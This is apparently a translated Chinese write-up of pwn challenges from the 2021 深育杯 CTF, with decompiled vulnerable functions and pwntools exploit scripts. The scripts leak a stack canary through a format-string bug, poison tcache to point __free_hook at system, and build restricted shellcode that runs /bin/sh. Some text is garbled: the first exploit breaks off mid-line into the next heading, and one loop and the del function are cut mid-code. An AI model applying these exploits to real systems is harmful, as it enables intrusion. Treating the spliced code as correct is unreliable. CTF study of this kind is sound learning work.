# 2021深育杯pwn、re WP详解
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
2021深育杯是深信服举办的ctf赛事，此次总结一下pwn和re的部分wp。此次用到的部分exp是借鉴一些pwner和官方给出的exp并对其进行了详细的补充说明，也是自己学习的过程，在此记录一下。
## PWN -> find_flag
###  题目分析
这个题目环境ubuntu20.04，保护全开，程序也是基于栈利用的，存在栈溢出、格式化字符串漏洞，比较简单。
    unsigned __int64 sub_132F()
    {
      char format[32]; // [rsp+0h] [rbp-60h] BYREF
      char v2[56]; // [rsp+20h] [rbp-40h] BYREF
      unsigned __int64 v3; // [rsp+58h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      printf("Hi! What's your name? ");
      gets(format);
      printf("Nice to meet you, ");
      strcat(format, "!\n");
      printf(format); 
      printf("Anything else? ");
      gets(v2);  
      return __readfsqword(0x28u) ^ v3;
    }
后门函数：
    int sub_1228()
    {
      return system("/bin/cat flag.txt");
    }
###  利用思路
  1. 通过格式化字符串泄露出程序基址和canary
  2. 通过栈溢出覆盖返回地址为程序后门函数。
###  exp
    # -*- coding: UTF-8 -*-    from pwn import *
    context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    io = remote('192.168.41.180', 2001)
    # libc = ELF('./libc-2.31.so')
    #io = process('./find_flag')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, '\x00'))
    uu64 = lambda data        : u64(data.ljust(8, '\x00'))
    ur64 = lambda data        : u64(data.rjust(8, '\x00'))
    sl('%17$paaa%19$p')
    ru('you, ')
    canary = int(rn(16),16) create_code
###  题目分析
题目仍然是ubuntu20.04，保护全开，  
程序有三个功能:add、del、get，没有edit功能。
    1.add
    2.2.get
    3.del
    4.bye
    >
add函数：
    ssize_t sub_13F0()
    {
      int v1; // [rsp+4h] [rbp-Ch]
      unsigned __int64 buf; // [rsp+8h] [rbp-8h]
      v1 = 0;
      if ( conut > 46 )
        return write(1, "no more data.\n", 0xFuLL);
      ++conut;
      buf = (unsigned __int64)malloc(0x324uLL);
      mprotect((void *)(buf & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);
      write(1, "content: ", 9uLL);
      read(0, (void *)buf, 0x3E8uLL);               // overflow
      qword_4060[conut] = buf;
      if ( *(_DWORD *)buf == 0xF012F012 )
      {
        while ( v1  0xFu )
            *(_BYTE *)(buf + v1 + 4) = 0;
          ++v1;
        }
        qword_4048 = buf + 4;
        ((void (*)(void))(buf + 4))();               //Restricted backdoor
      }
      else
      {
        *(_DWORD *)buf = 4;
      }
      return write(1, "create successfully.\n", 0x15uLL);
    }
创建堆块大小固定，如果buf前四个字节不等于0xF012F012则buf前四个字节等于4，存在堆溢出、还有一个代码执行（代码有要求：buf起始必须等于0xF012F012，每个字节必须小于0xf），如果没有接触过很难利用。  
del函数：
    ssize_t sub_15F0()
    {
      ssize_t result; // rax
      int i; // [rsp+8h] [rbp-8h]
      int v2; // [rsp+Ch] [rbp-4h]
      write(1, "id: ", 4uLL);
      result = sub_132A();
      v2 = result;
      if ( (_DWORD)result != -1 )
      {
        if ( (int)result 
转换成字节码为`\x52\x5F\x48\x81\xC7\x0F\x03\x00\x00\x31\xF6\x31\xD2\x6A\x3B\x58\x0F\x05`,发现里面有很多值都超过了0xf的限制，所以这里去除高位保留低位，得到`\x00\x00\x08\x01\x07\x0f\x03\x00\x00\x01\x06\x01\x0e\x08\x0a\x00\x0f\x05`然后高位由符合条件的汇编生成，同样`/bin/sh`也是一样的构造方法。  
具体过程和解释可参考exp及其注释内容  
 **注意**  
rip寻址，指向的是当前rip指令地址加上当前指令长度，如：  
`add ecx, DWORD PTR [rip+0x20f]`实际赋给ecx的是[rip+0x20f]+6（该指令长度）
###  exp
**exp1：堆溢出方式**
    from pwn import  *
    context(arch='amd64',endian='el',os='linux')
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    context.log_level = 'debug'
    debug = 1
    if debug == 1:
      p = process("./create_code")
      libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
    else:
      p = remote("192.168.41.241",2007)
      libc = ELF("./libc.so.6",checksec=False)
    #call_libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    sa = lambda s,n : p.sendafter(s,n)
    sla = lambda s,n : p.sendlineafter(s,n)
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    leak = lambda name,addr :log.success(name+":"+hex(addr))
    elf = ELF("./create_code",checksec=False)
    def cmd(cho):
      sla("> ",str(cho))
    def add(content):
      cmd(1)
      sleep(0.02)
      sa("content: ",content)
    def show(idx):
      cmd(2)
      sla("id: ",str(idx))
    def free(idx):
      cmd(3)
      sla("id: ",str(idx))
    def exit():
      cmd(4)
                     #add     1     2  3           4  5  6  7  8    
                     #free 1     2        3  4  5        6                    
    add('a\n')       # 0   -  4  3  3  3  2  1  1  1  1  -  4  4
    add('a\n')       # 1   0  0  -  4  4  3  2  -  3  3  2  2  2*       此处是每次add del的idx索引编号记录
    add('a\n')       # 2   1  1  0  0 *0  0  -  -  -  4- 3  3  3
    add('a\n')       # 3   2  2  1  1  1  -  -  -  -  -  -  -  5
    add('a\n')       # 4   3  3  2  2  2  1  0  0  0  0  0  0  0 
    #gdb.attach(p)    # 5              *5  4  3  2  2  2  1  1  1
    free(0)
    add('a'*0x320 + p64(0) + p64(0x661) ) # overwrite chunk0 size to 0x661 by heap overflow 
    free(0)                               # free 0x661 chunk0 , free to unsorted bin
    add('aaaaaaaa')                       # add chunk4 to cut unsorted bin ,last_remainder 0x330 chunk,it's fd/bk = main_arena+96
    #gdb.attach(p)
    show(0)                   # leak libc by main_arena+96 address
    p.recvuntil("\x00\x00")
    libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00')) -0x1ebbe0
    # one = [0xe6c7e,0xe6c81,0xe6c84]
    info("libc.address = " + hex(libc.address))
    #gdb.attach(p)
    add('a\n')                            # malloc chunk5 by unsorted bin 
    free(1)                               # tcache attack 
    free(0)
    free(2)
    #gdb.attach(p)                         #(0x330)   tcache_entry[49](3): 0x55d480c8d5d0 --> 0x55d480c8d900 --> 0x55d480c8dc30
    add('a'*0x320 + p64(0) + p64(0x331) + p64(libc.sym['__free_hook']-0x10)) # overwrite chunk by heap overflow to modify fd to freehook-0x10
                           # (0x330)   tcache_entry[49](3): 0x55d480c8d900 --> 0x7fc407172b18
    add('a\n')                            #(0x330)   tcache_entry[49](3): 0x7fc407172b18
    free(1)                               #(0x330)   tcache_entry[49](3): 0x55d480c8d2a0 --> 0x7fc407172b18
    add('a'*0x320 + p64(0) + p64(0x331) + "/bin/sh\x00"*4) # overwrite chunk2 fd = '/bin/sh'   tcache_entry[49](3):0x7fc407172b18
    add('a'*0x10 + p64(libc.sym['system'])) # modify freehook to system
    gdb.attach(p)
    free(2)                               # free chunk2
    ti()
**exp2：有限制的后门方式**
    from pwn import*
    context(os='linux', arch='amd64')
    #context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    BINARY = './create_code'
    elf = ELF(BINARY)
    if len(sys.argv) > 1and sys.argv[1] == 'r':
        HOST = "127.0.0.1"
        PORT = 8888
        s = remote(HOST, PORT)
    else:
        s = process(BINARY)
    #context.terminal = ['tmux', 'splitw', '-h']
    #s = gdb.debug(BINARY)
    #gdb.attach(s)
    s.sendline('1')
    print(s.recvuntil("content: "))
    flag = b"\x12\xF0\x12\xF0"
    # make buf offest
    # \x01\x05\x00\x06\x00\x00    buf开头  \x01为cl的偏移,后面cl移动就靠add cl,BYTE PTR [rdx],下相当于add cl,1
    buf = asm('''
     add DWORD PTR [rip+0x600], eax 
    ''')
    # initial ecx = 0
    # make xor ecx,ecx   code 0x31c9
    buf += asm('''
     add al, 0x0d
     add al, 0x0d
     add al, 0x0d
     add BYTE PTR [rdx+rax*1], al
     add al, 0x01
     add BYTE PTR [rdx+rax*1], al
     add BYTE PTR [rdx+rax*1], al
     add BYTE PTR [rdx+rax*1], al
     add BYTE PTR [rdx+rax*1], al
     add BYTE PTR [rdx+rax*1], al